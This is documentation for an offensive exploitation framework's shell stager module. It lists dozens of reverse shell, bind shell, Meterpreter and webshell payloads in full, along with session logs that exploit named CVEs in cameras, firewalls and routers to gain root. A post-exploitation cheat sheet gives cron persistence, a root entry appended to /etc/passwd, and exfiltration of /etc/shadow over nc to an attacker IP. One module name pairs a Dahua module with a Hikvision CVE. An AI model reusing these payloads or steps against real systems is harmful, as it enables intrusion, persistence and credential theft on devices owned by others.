# Shell Stager and Post-Exploitation

**Language:** English (en-US) | **pt-BR:** [../pt-BR/13-shell-stager.md](../pt-BR/13-shell-stager.md)

---

## Overview

EmbedXPL-Forge includes a built-in **Shell Stager** framework implemented in `embedxpl/core/exploit/shell_stager.py`. It is integrated into weaponized exploit modules via `ShellStagingMixin` and provides:

- 27 shell types: reverse shells (Linux/Unix + Windows), bind shells, Meterpreter (6 variants), webshells (PHP/ASPX/JSP)
- A PTY-aware built-in listener: raw mode, `select()`-based I/O multiplexer, SIGWINCH resize forwarding, auto PTY upgrade
- Meterpreter RC file generation (`msfconsole -r`)
- `force_exploit` flag to skip `check()` and go straight to exploit
- `ask_on_fail` to prompt user when `check()` returns False
- GTFOBins post-exploitation cheatsheet printed automatically after shell session closes

---

## `ShellStagingMixin` options

All weaponized exploit modules that include `ShellStagingMixin` expose these options:

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `lhost` | `OptIP` | `""` | Attacker IP address for reverse shells and Meterpreter handler |
| `lport` | `OptPort` | `4444` | Listener TCP port |
| `shell_type` | `OptString` | `auto` | Shell payload type (see full table below) |
| `force_exploit` | `OptBool` | `false` | Skip `check()` and go straight to exploitation |
| `ask_on_fail` | `OptBool` | `true` | Prompt user if `check()` returns False or None |
| `pty_upgrade` | `OptBool` | `true` | Auto-send `python3 -c "import pty; pty.spawn('/bin/sh')"` on shell connect |
| `listener_timeout` | `OptPort` | `60` | Seconds to wait for incoming reverse shell before giving up |

Set these using the standard `set` command inside the interactive shell:

```
exf (module) > set lhost 10.10.14.22
exf (module) > set lport 9001
exf (module) > set shell_type nc_mkfifo
exf (module) > set pty_upgrade true
exf (module) > run
```

---

## Supported shell types

### Linux / Unix reverse shells

| `shell_type` | Platform | Payload |
|---|---|---|
| `bash` | Linux/macOS | `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` |
| `bash_udp` | Linux | `bash -i >& /dev/udp/LHOST/LPORT 0>&1` |
| `nc` | Linux (nc with -e) | `nc -e /bin/sh LHOST LPORT` |
| `nc_mkfifo` | Linux (all nc variants) | `rm /tmp/.f; mkfifo /tmp/.f; cat /tmp/.f \| /bin/sh -i 2>&1 \| nc LHOST LPORT >/tmp/.f` |
| `ncat` | Linux | `ncat LHOST LPORT -e /bin/bash` |
| `socat` | Linux | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT` |
| `python` | Python 3 | `python3 -c "import socket,subprocess,os;s=socket.socket(...);s.connect(('LHOST',LPORT));..."` |
| `python2` | Python 2 | `python -c "import socket,subprocess,os;s=socket.socket(...);s.connect(('LHOST',LPORT));..."` |
| `perl` | Perl | `perl -e 'use Socket;$i="LHOST";$p=LPORT;...'` |
| `ruby` | Ruby | `ruby -rsocket -e 'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` |
| `php` | PHP | `php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'` |
| `awk` | awk | `awk 'BEGIN {s="/inet/tcp/0/LHOST/LPORT";while(42){...}}'` |
| `java` | Java | `r=Runtime.getRuntime();p=r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/LHOST/LPORT;..."])` |

### Windows reverse shells

| `shell_type` | Platform | Payload |
|---|---|---|
| `powershell` | Windows PowerShell | Full TCP socket with Read/Write loop |
| `powershell_b64` | Windows PowerShell | Base64-encoded `powershell -EncodedCommand <b64>` |
| `cmd_nc` | Windows cmd.exe | `cmd.exe /c nc.exe LHOST LPORT -e cmd.exe` |

### Bind shells (target listens, attacker connects)

| `shell_type` | Platform | Payload |
|---|---|---|
| `nc_bind` | Linux | `nc -lvp LPORT -e /bin/sh` |
| `python_bind` | Python 3 | `python3 -c "import socket,subprocess;s=socket.socket();s.bind(('',LPORT));s.listen(1);..."` |

### Meterpreter (MSF handler required)

| `shell_type` | Platform | MSF payload | Output |
|---|---|---|---|
| `meterpreter_linux` | Linux x86 | `linux/x86/meterpreter/reverse_tcp` | `msfvenom -p ... -f raw -o /tmp/stage.elf` |
| `meterpreter_linux_x64` | Linux x64 | `linux/x64/meterpreter/reverse_tcp` | `msfvenom -p ... -f raw -o /tmp/stage.elf` |
| `meterpreter_windows` | Windows x86 | `windows/meterpreter/reverse_tcp` | `msfvenom -p ... -f exe -o /tmp/stage.exe` |
| `meterpreter_windows_x64` | Windows x64 | `windows/x64/meterpreter/reverse_tcp` | `msfvenom -p ... -f exe -o /tmp/stage.exe` |
| `meterpreter_php` | PHP | `php/meterpreter/reverse_tcp` | `msfvenom -p ... -f raw -o /tmp/stage.php` |
| `meterpreter_python` | Python | `python/meterpreter/reverse_tcp` | `msfvenom -p ... -f raw -o /tmp/stage.py` |

### Webshells (file content for upload)

| `shell_type` | Platform | Access method |
|---|---|---|
| `php_webshell` | PHP | `http://TARGET/shell.php?cmd=id` |
| `aspx_webshell` | ASP.NET | `http://TARGET/shell.aspx?cmd=whoami` |
| `jsp_webshell` | Java/JSP | `http://TARGET/shell.jsp?cmd=uname+-a` |

### Auto mode

| `shell_type` | Behavior |
|---|---|
| `auto` | Tries `bash` → `python` → `nc_mkfifo` → `perl` in sequence, using the first one that produces a connection |

---

## Terminal I/O session examples

### Reverse shell (`bash`) with PTY upgrade

```
exf (hikvision/rtsp_rce_cve_2021_36260) > set target 192.168.1.100
[+] target => 192.168.1.100
exf (hikvision/rtsp_rce_cve_2021_36260) > set lhost 10.10.14.22
[+] lhost => 10.10.14.22
exf (hikvision/rtsp_rce_cve_2021_36260) > set lport 4444
[+] lport => 4444
exf (hikvision/rtsp_rce_cve_2021_36260) > set shell_type bash
[+] shell_type => bash
exf (hikvision/rtsp_rce_cve_2021_36260) > run

[*] Running module embedxpl.modules.exploits.cameras.hikvision.rtsp_rce_cve_2021_36260...
[*] Connecting to rtsp://192.168.1.100:554/...
[*] Sending payload: bash -i >& /dev/tcp/10.10.14.22/4444 0>&1
[*] Listening on 0.0.0.0:4444 (timeout: 60s)...
[+] Connection received from 192.168.1.100:43218
[*] PTY upgrade: python3 -c "import pty; pty.spawn('/bin/sh')"
[+] Shell upgraded to PTY

$ id
uid=0(root) gid=0(root) groups=0(root)
$ uname -a
Linux DVR-9000 3.10.108-rt #1 PREEMPT RT SMP Mon Jan 15 09:42:13 CST 2024 armv7l GNU/Linux
$ whoami
root
$ [Ctrl+D]

[*] Shell session closed.

--- GTFOBins Post-Exploitation Quick Reference ---
Persistence:
  echo "* * * * * bash -i >& /dev/tcp/10.10.14.22/4444 0>&1" >> /var/spool/cron/root
Data exfiltration:
  cat /etc/shadow | nc 10.10.14.22 5555
Upgrade shell:
  python3 -c "import pty; pty.spawn('/bin/bash')"
  export TERM=xterm; stty rows 50 cols 200
```

---

### Reverse shell (`nc_mkfifo`) — no `-e` support

```
exf (dahua/cctv_rce_cve_2021_36260) > set lhost 10.10.14.22
[+] lhost => 10.10.14.22
exf (dahua/cctv_rce_cve_2021_36260) > set shell_type nc_mkfifo
[+] shell_type => nc_mkfifo
exf (dahua/cctv_rce_cve_2021_36260) > run

[*] Running module...
[*] Payload: rm /tmp/.f; mkfifo /tmp/.f; cat /tmp/.f | /bin/sh -i 2>&1 | nc 10.10.14.22 4444 >/tmp/.f
[*] Listening on 0.0.0.0:4444 (timeout: 60s)...
[+] Connection received from 192.168.1.101:53219
[*] PTY upgrade: python3 -c "import pty; pty.spawn('/bin/sh')"

$ id
uid=0(root) gid=0(root) groups=0(root)
```

---

### Bind shell (`nc_bind`) — no outbound connectivity

```
exf (fortinet/fortios_auth_bypass_cve_2022_40684) > set shell_type nc_bind
[+] shell_type => nc_bind
exf (fortinet/fortios_auth_bypass_cve_2022_40684) > set lport 5555
[+] lport => 5555
exf (fortinet/fortios_auth_bypass_cve_2022_40684) > run

[*] Running module...
[*] Payload: nc -lvp 5555 -e /bin/sh
[*] Executed bind command on 192.168.1.1
[*] Waiting for bind shell to start...
[*] Connecting to 192.168.1.1:5555...
[+] Connected to bind shell at 192.168.1.1:5555

# id
uid=0(root) gid=0(root)
```

---

### Meterpreter handler with MSF RC file

```
exf (fortinet/fortios_sslvpn_rce_cve_2024_21762) > set shell_type meterpreter_linux_x64
[+] shell_type => meterpreter_linux_x64
exf (fortinet/fortios_sslvpn_rce_cve_2024_21762) > set lhost 10.10.14.22
[+] lhost => 10.10.14.22
exf (fortinet/fortios_sslvpn_rce_cve_2024_21762) > run

[*] Running module...
[*] Meterpreter mode selected. Generating msfvenom command:
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.22 LPORT=4444 -f raw -o /tmp/stage.elf
[*] MSF RC file written to: /tmp/embedxpl_handler.rc
[*] Content:
    use exploit/multi/handler
    set PAYLOAD linux/x64/meterpreter/reverse_tcp
    set LHOST 10.10.14.22
    set LPORT 4444
    set ExitOnSession false
    exploit -j -z
[*] Start handler: msfconsole -r /tmp/embedxpl_handler.rc
[*] Executing delivery on target...
[*] Stage delivered to 192.168.1.1
[+] Meterpreter session opened (waiting for handler callback)
```

---

### `auto` mode — sequential shell attempts

```
exf (tplink/wr841n_parental_control_rce_cve_2025_9377) > set shell_type auto
[+] shell_type => auto
exf (tplink/wr841n_parental_control_rce_cve_2025_9377) > run

[*] Running module...
[*] auto mode: trying shells in sequence
[*]   [1/4] bash      -> Listening on 0.0.0.0:4444 (10s)...
[-]          bash: no connection (bash not available on target)
[*]   [2/4] python    -> Listening on 0.0.0.0:4444 (10s)...
[+]          python: connection received from 192.168.1.1:48212
[+] Shell acquired via python
[*] PTY upgrade: python3 -c "import pty; pty.spawn('/bin/sh')"

$ id
uid=0(root) gid=0(root)
```

---

### Webshell (`php_webshell`) — upload and access

```
exf (cameras/dahua/cctv_firmware_upload_no_verify) > set shell_type php_webshell
[+] shell_type => php_webshell
exf (cameras/dahua/cctv_firmware_upload_no_verify) > run

[*] Running module...
[*] Webshell selected. Content:
    <?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; system($_REQUEST['cmd']); echo '</pre>'; } ?>
[*] Uploading webshell to target as 'update.php'...
[+] Upload successful: http://192.168.1.101/cgi-bin/update.php
[*] Test command: curl "http://192.168.1.101/cgi-bin/update.php?cmd=id"
[+] Response: <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
```

---

### `force_exploit` — skip `check()`

```
exf (sonicwall/sonicos_sslvpn_auth_bypass_cve_2024_53704) > set force_exploit true
[+] force_exploit => true
exf (sonicwall/sonicos_sslvpn_auth_bypass_cve_2024_53704) > run

[*] force_exploit enabled — skipping check()
[*] Running module directly...
```

---

### `ask_on_fail` — prompt on negative check

```
exf (paloalto/panos_auth_bypass_cve_2025_0108) > check

[-] Target is not vulnerable (target may be patched)

exf (paloalto/panos_auth_bypass_cve_2025_0108) > run

[*] check() returned False.
[?] Continue anyway? (ask_on_fail=true) [y/N]: y
[*] Proceeding despite negative check result...
[*] Running module...
```

---

### Connection timeout

```
exf (module) > set listener_timeout 30
[+] listener_timeout => 30
exf (module) > run

[*] Listening on 0.0.0.0:4444 (timeout: 30s)...
[-] No connection received after 30 seconds.
[-] Possible causes:
    - Target cannot reach attacker (firewall/NAT)
    - Shell command was not executed on target
    - Use 'set shell_type bind' if no outbound connectivity from target
    - Use 'set lhost <correct-IP>' if multi-homed
```

---

## PTY upgrade reference

When `pty_upgrade true` (default), the stager sends this command immediately after the shell connects:

```bash
python3 -c "import pty; pty.spawn('/bin/sh')"
```

If Python 3 is not available, it falls back to:

```bash
script -qc /bin/sh /dev/null
```

After PTY upgrade, the local terminal is put in raw mode with proper resize support:

```bash
# On remote shell, after PTY upgrade:
export TERM=xterm-256color
stty rows 40 cols 160
```

---

## MSF RC file manual usage

When using any `meterpreter_*` shell type, an RC file is written to `/tmp/embedxpl_handler.rc`. Start the handler:

```bash
msfconsole -q -r /tmp/embedxpl_handler.rc

[*] Processing /tmp/embedxpl_handler.rc for ERB directives.
resource (/tmp/embedxpl_handler.rc)> use exploit/multi/handler
resource (/tmp/embedxpl_handler.rc)> set PAYLOAD linux/x64/meterpreter/reverse_tcp
PAYLOAD => linux/x64/meterpreter/reverse_tcp
resource (/tmp/embedxpl_handler.rc)> set LHOST 10.10.14.22
LHOST => 10.10.14.22
resource (/tmp/embedxpl_handler.rc)> set LPORT 4444
LPORT => 4444
resource (/tmp/embedxpl_handler.rc)> set ExitOnSession false
ExitOnSession => false
resource (/tmp/embedxpl_handler.rc)> exploit -j -z
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.10.14.22:4444
[+] Meterpreter session 1 opened (10.10.14.22:4444 -> 192.168.1.1:52233)

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...
meterpreter > sysinfo
Computer     : FortiGate-200F
OS           : Linux 5.10.167 FortiGate
Architecture : x64
meterpreter >
```

---

## GTFOBins post-exploitation reference

Printed automatically after every shell session closes:

```
--- GTFOBins Post-Exploitation Quick Reference ---
Shell upgrade:
  python3 -c "import pty; pty.spawn('/bin/bash')"
  script -qc /bin/bash /dev/null
  export TERM=xterm; stty raw -echo; fg

Persistence:
  echo "*/5 * * * * bash -i >& /dev/tcp/LHOST/LPORT 0>&1" | crontab -
  echo 'root:x:0:0:root:/root:/bin/bash' >> /etc/passwd   # only if writable

Privilege escalation check:
  sudo -l
  find / -perm -4000 -type f 2>/dev/null
  cat /etc/cron.* 2>/dev/null

Lateral movement:
  cat /etc/hosts; arp -n; ip route
  for i in $(seq 1 254); do ping -c1 192.168.1.$i &>/dev/null && echo "192.168.1.$i up"; done

Data exfil:
  cat /etc/shadow | nc LHOST 5555
  tar czf - /etc | nc LHOST 5555
```
